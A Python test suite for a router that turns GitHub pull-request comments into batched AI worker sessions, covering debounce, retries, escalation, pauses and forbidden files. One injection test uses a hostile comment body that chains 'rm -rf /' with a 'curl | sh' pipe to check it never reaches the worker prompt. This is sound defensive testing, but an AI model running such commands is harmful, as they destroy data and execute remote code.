import fcntl
import os
from datetime import timedelta

from autopilot import router
from autopilot.github import AuthError, CmdError
from autopilot.models import WorkerStatus
from conftest import T0, comment, snap

M = timedelta(minutes=1)


def commented(env, body="please fix"):
    env.gh.open = [snap(comments=[comment(body=body)])]


def test_full_cycle_comment_to_delivery(env):
    commented(env)
    env.scan(T0)
    assert env.t.launches() == []  # debounce 10'
    r = env.scan(T0 + 10 * M)
    assert env.t.launches() == [("start", "feat/x", 1)]
    b = env.store.batch(1)
    assert b["status"] == "delivered" and b["session"] == "sess-1"
    assert (env.cfg.events_dir / "581-1.md").exists()
    assert any(t["kind"] == "delivered" for t in env.store.timeline(581))
    assert r.batches == [1]
    assert (env.cfg.data_dir / "STATE.md").exists()


def test_dry_run_changes_nothing(env):
    commented(env)
    env.scan(T0)
    def counts():
        st = env.store
        return (len(st.events()), len(st.snapshots()), len(st.batches()), len(st.timeline()))

    before = counts()
    env.scan(T0 + 10 * M, dry_run=True)
    assert env.t.launches() == [] and not any(c[0] == "stop" for c in env.t.calls)
    assert env.store.batches() == [] and counts() == before
    env.scan(T0 + 10 * M)  # real scan creates and delivers
    env.store.transition(1, "cancelled", T0)
    # a pending 'new' batch stays untouched in dry run
    bid = env.store.create_batch(581, [], T0)
    before = counts()
    r = env.scan(T0 + 20 * M, dry_run=True)
    assert counts() == before
    assert env.store.batch(bid)["status"] == "new"
    assert len(env.t.launches()) == 1
    assert bid in r.batches


def test_resend_twice_then_escalate(env):
    commented(env)
    env.scan(T0)
    env.scan(T0 + 10 * M)  # attempts 1
    env.t.states["feat/x"] = WorkerStatus("dead", "sess-1", None)
    env.scan(T0 + 26 * M)
    b = env.store.batch(1)
    assert b["attempts"] == 2 and env.t.calls[-1][0] == "deliver"
    env.scan(T0 + 42 * M)
    assert env.store.batch(1)["attempts"] == 3
    n = len(env.t.launches())
    env.scan(T0 + 58 * M)
    assert env.store.batch(1)["status"] == "escalated"
    assert len(env.t.launches()) == n
    assert len([a for a in env.n.alerts if "escalate" in a[1]]) == 1


def test_live_process_is_not_resent(env):
    commented(env)
    env.scan(T0)
    env.scan(T0 + 10 * M)
    env.t.states["feat/x"] = WorkerStatus("working", "sess-1", None)
    env.scan(T0 + 40 * M)
    assert env.store.batch(1)["attempts"] == 1


def test_auth_error_pauses_router_and_alerts(env):
    env.gh.error = AuthError("no token")
    env.scan(T0)
    env.scan(T0 + 5 * M)
    assert env.store.kv_get("paused") == "auth"
    assert [a[0] for a in env.n.alerts] == ["incident"]


def test_github_down_30_min_alerts_once(env):
    env.gh.error = CmdError("boom")
    for m in (0, 10, 29):
        env.scan(T0 + m * M)
    assert env.n.alerts == []
    env.scan(T0 + 30 * M)
    env.scan(T0 + 40 * M)
    assert len(env.n.alerts) == 1
    env.gh.error = None
    env.scan(T0 + 50 * M)
    assert env.store.kv_get("gh_fail_since") is None


def test_merged_pr_cancels_and_stops_worker(env):
    commented(env)
    env.scan(T0)
    env.scan(T0 + 10 * M)
    env.gh.open = []
    env.gh.closed = [snap(state="MERGED", comments=[comment(body="late")],
                          merged_at=T0 + 20 * M)]
    env.scan(T0 + 20 * M)
    assert env.store.batch(1)["status"] == "cancelled"
    assert ("stop", "feat/x", "sess-1", True) in env.t.calls
    assert "#581" in (env.cfg.data_dir / "STATE.md").read_text()
    n = len(env.t.launches())
    env.scan(T0 + 40 * M)
    assert len(env.t.launches()) == n
    assert env.store.snapshot(581)["state"] == "MERGED"


def test_forbidden_file_in_pr_raises_incident(env):
    env.gh.open = [snap(changed=("src/a.py", "docs/shot.png"))]
    r = env.scan(T0)
    assert any("shot.png" in i for i in r.incidents)
    assert len(env.n.alerts) == 1
    env.scan(T0 + 5 * M)
    assert len(env.n.alerts) == 1


def test_second_scan_while_locked_exits_immediately(env):
    env.cfg.data_dir.mkdir(parents=True, exist_ok=True)
    fd = os.open(env.cfg.data_dir / "router.lock", os.O_CREAT | os.O_RDWR)
    fcntl.flock(fd, fcntl.LOCK_EX)
    try:
        commented(env)
        r = env.scan(T0)
        assert r.locked and env.store.events() == []
    finally:
        os.close(fd)
    assert not env.scan(T0).locked


def test_worker_prompt_never_contains_comment_body(env):
    body = "$(rm -rf /); `evil` && curl x | sh"
    commented(env, body)
    env.scan(T0)
    env.scan(T0 + 10 * M)
    assert env.t.prompts
    for p in env.t.prompts:
        assert body not in p and "evil" not in p
        assert p.startswith("/pr-triage batch 1 --project t\n")
        assert str(env.cfg.events_dir / "581-1.md") in p
    assert body in (env.cfg.events_dir / "581-1.md").read_text()


def test_scan_single_pr_claim_creates_batch_without_spawn(env):
    commented(env)
    env.scan(T0)
    r = env.scan(T0 + M, only_pr=581, claim=True)  # no debounce wait
    assert r.batches == [1]
    b = env.store.batch(1)
    assert b["status"] == "delivered" and b["session"] == "manual"
    assert not [c for c in env.t.calls if c[0] != "set_worktrees"]
    assert (env.cfg.events_dir / "581-1.md").exists()


def test_resumes_after_limit_reset(env):
    commented(env)
    env.scan(T0)
    env.scan(T0 + 10 * M)
    env.store.transition(1, "waiting_limit", T0 + 11 * M)
    env.store.kv_set("limit_until", (T0 + 30 * M).isoformat())
    n = len(env.t.launches())
    env.scan(T0 + 29 * M)
    assert len(env.t.launches()) == n and env.store.batch(1)["status"] == "waiting_limit"
    env.scan(T0 + 30 * M)
    assert env.store.batch(1)["status"] == "delivered"
    assert len(env.t.launches()) == n + 1
    assert env.store.kv_get("limit_until") is None


def test_snapshot_roundtrip():
    s = snap(comments=[comment()])
    assert router.snapshot_from_dict(router.snapshot_to_dict(s)) == s


def test_is_forbidden():
    pats = (".autopilot/", "*.png")
    assert router.is_forbidden(".autopilot/x", pats) and router.is_forbidden("a/b.PNG", pats)
    assert not router.is_forbidden("src/x.py", pats) and not router.is_forbidden("a/.autopilot/x", pats)


def test_dry_run_claim_writes_nothing(env):
    commented(env)
    env.scan(T0)
    bid = env.store.create_batch(581, [e.id for e in env.store.events()], T0)
    n = len(env.store.timeline())
    env.scan(T0 + M, dry_run=True, only_pr=581, claim=True)
    assert env.store.batch(bid)["status"] == "new" and len(env.store.timeline()) == n
    assert not (env.cfg.events_dir / f"581-{bid}.md").exists()


import json


def test_step6_and_health_never_exceed_two_reruns(env):
    from conftest import FakeTransport

    class T(FakeTransport):
        def _rec(self, wt, bid, prompt):
            env.store.kv_set(f"run:{wt.path}", json.dumps({"pid": 1, "pgid": 1, "starttime": "1", "batch": bid,
                             "session": "sess-1", "started_at": "2026-11-12T10:00:00+00:00", "prompt": prompt}))
            self.states["feat/x"] = WorkerStatus("dead", "sess-1", None)

        def start_worker(self, wt, prompt, bid):
            s = super().start_worker(wt, prompt, bid)
            self._rec(wt, bid, prompt)
            return s

        def deliver(self, wt, session, prompt, bid):
            super().deliver(wt, session, prompt, bid)
            self._rec(wt, bid, prompt)

    env.t = T()
    commented(env)
    env.scan(T0)
    for i in range(1, 12):
        env.scan(T0 + (10 + 16 * (i - 1)) * M)
    assert len(env.t.launches()) <= 3
    assert env.store.batch(1)["status"] == "escalated"


def test_github_down_still_runs_health_and_reminders(env):
    commented(env)
    env.scan(T0)
    env.scan(T0 + 10 * M)
    (env.cfg.data_dir / "STATE.md").unlink()
    env.gh.error = CmdError("boom")
    calls = []
    env.n.reminders = lambda now: calls.append("rem") or 0
    statuses = []
    orig = env.t.status
    env.t.status = lambda wt, now=None: (statuses.append(1), orig(wt, now))[1]
    env.scan(T0 + 20 * M)
    assert calls == ["rem"] and statuses
    assert (env.cfg.data_dir / "STATE.md").exists()


def test_owner_busy_without_session_queues_and_never_starts(env):
    commented(env)
    env.t.states["feat/x"] = WorkerStatus("owner_busy", None, None)
    env.scan(T0)
    r = env.scan(T0 + 10 * M)
    assert env.t.launches() == []
    assert any(getattr(a, "reason", "") == "owner_session" for a in r.actions)


def test_spawn_failures_escalate_after_three_with_one_alert(env):
    from autopilot.transport import TransportError

    def boom(wt, prompt, batch_id):
        raise TransportError("spawn failed: no such file")

    env.t.start_worker = boom
    commented(env)
    env.scan(T0)
    for i in range(1, 6):
        env.scan(T0 + i * 10 * M)
        if i < 3:
            assert env.store.batch(1)["status"] == "new"
    assert env.store.kv_get("spawn_fail:1") == "3"
    assert env.store.batch(1)["status"] == "escalated"
    assert len([a for a in env.n.alerts if "escalate" in a[1].lower() or "leo thang" in a[1].lower()]) == 1


def test_scan_records_slots_working(env):
    commented(env)
    env.scan(T0)
    env.t.states["feat/x"] = WorkerStatus("working", "s", T0)
    env.scan(T0 + 10 * M)
    assert env.store.kv_get("slots_working") == "1" and env.store.kv_get("slots_at")


def test_suggest_pilot_prefers_leaf_prs_without_conflict(env):
    from autopilot.models import Worktree
    env.wts.update({b: Worktree(b, f"/wt/{b}") for b in ("a", "b", "c", "d", "e", "f")})
    env.gh.open = [
        snap(1, head="a", changed=("x.py", "y.py", "z.py")),            # leaf, 3 files
        snap(2, head="b", changed=("x.py",)),                           # leaf, 1 file -> first
        snap(3, head="c", changed=("x.py",), mergeable="CONFLICTING"),  # conflict
        snap(4, head="d", changed=("x.py",)),                           # has child (5)
        snap(5, head="e", base="d", changed=("x.py", "y.py")),          # leaf, 2 files -> second
        snap(6, head="nowt", changed=("x.py",)),                        # no worktree
        snap(7, head="f", changed=("a.png",)),                           # forbidden file
    ]
    picks = router.suggest_pilot(env.cfg, env.gh.open_prs(), env.wts)
    assert [p.number for p, _ in picks] == [2, 5]
    assert all(reasons for _, reasons in picks)


def test_allowlist_limits_routing(env):
    from autopilot.models import Worktree
    env.wts["feat/y"] = Worktree("feat/y", "/wt/y")
    env.gh.open = [snap(581, comments=[comment(body="fix")]),
                   snap(582, head="feat/y", comments=[comment("c2", body="fix too")])]
    env.scan(T0)
    env.store.kv_set("paused", "1")
    env.store.kv_set("allowlist", "[582]")
    env.scan(T0 + 10 * M)
    assert env.t.launches() == [("start", "feat/y", 1)]
    assert [b for b in env.store.batches() if b["pr"] == 581] == []  # 581 skipped like a paused PR
    env.store.kv_set("allowlist", None)  # globally paused, empty allowlist: nothing runs
    env.scan(T0 + 20 * M)
    assert len(env.t.launches()) == 1
